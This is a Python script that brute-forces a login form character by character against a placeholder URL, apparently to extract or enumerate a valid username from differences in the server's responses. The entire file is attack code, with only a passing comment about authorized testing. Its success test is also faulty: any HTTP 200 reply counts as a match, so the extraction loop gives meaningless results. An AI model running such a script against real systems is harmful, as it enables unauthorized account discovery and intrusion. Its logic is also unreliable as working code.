import requests
import string
import time

url = "<target-url>"

# Full visible ASCII set
char_set = string.ascii_letters + string.digits + string.punctuation

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# ----------------------------
# Step 1: Establish a baseline
# ----------------------------
baseline_response = requests.post(
    url,
    data={"username": "baseline_test", "password": "baseline"},
    headers=headers
)

baseline_length = len(baseline_response.content)

# ----------------------------
# Step 2: Custom success logic
# ----------------------------
def custom_callback(response):
    """
    Return True if response looks like success.
    Adjust logic for your authorized test system.
    """
    failure_markers = ["invalid", "error", "failed", "denied"]
    body = response.text.lower()
    return not any(marker in body for marker in failure_markers)

# ----------------------------
# Step 3: Unified success check
# ----------------------------
def is_success(response):
    status_ok = response.status_code in (200, 302)
    length_changed = len(response.content) != baseline_length
    callback_ok = custom_callback(response)

    return status_ok or length_changed or callback_ok

# ----------------------------
# Step 4: Iterative test loop
# ----------------------------
successful_chars = ""
continue_search = True

while continue_search:
    continue_search = False

    for char in char_set:
        data = {
            "username": f"{successful_chars}{char}",
            "password": "test"
        }

        response = requests.post(url, data=data, headers=headers)

        if is_success(response):
            successful_chars += char
            continue_search = True
            print(f"[+] Match detected: '{char}'")
            break

    if not continue_search:
        print("[-] No match found for next position")

print(f"[✓] Final collected value: {successful_chars}")
